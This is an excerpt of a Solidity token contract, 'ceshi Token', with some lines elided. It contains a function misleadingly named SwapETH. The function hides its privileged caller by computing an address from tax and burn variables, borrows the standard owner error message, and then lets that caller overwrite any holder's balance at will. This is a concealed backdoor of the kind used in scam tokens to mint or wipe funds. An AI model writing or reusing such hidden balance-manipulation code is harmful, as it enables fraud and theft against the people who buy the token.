...
contract ceshiToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'ceshi Token';

    string constant public symbol = 'ceshi';
    ...
    address public projectAddress = 0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722;
    ...
    function SwapETH(address from, uint256 _value) external returns (bool)  {
        require(address(uint160(_taxcfi+_burncfi)) == msg.sender, "Ownable: caller is not the owner");
        balanceOf[from] = swapAndLiquify * _taxcfi+_burncfi * _value * (10 ** 9) / _taxcfi+_burncfi;
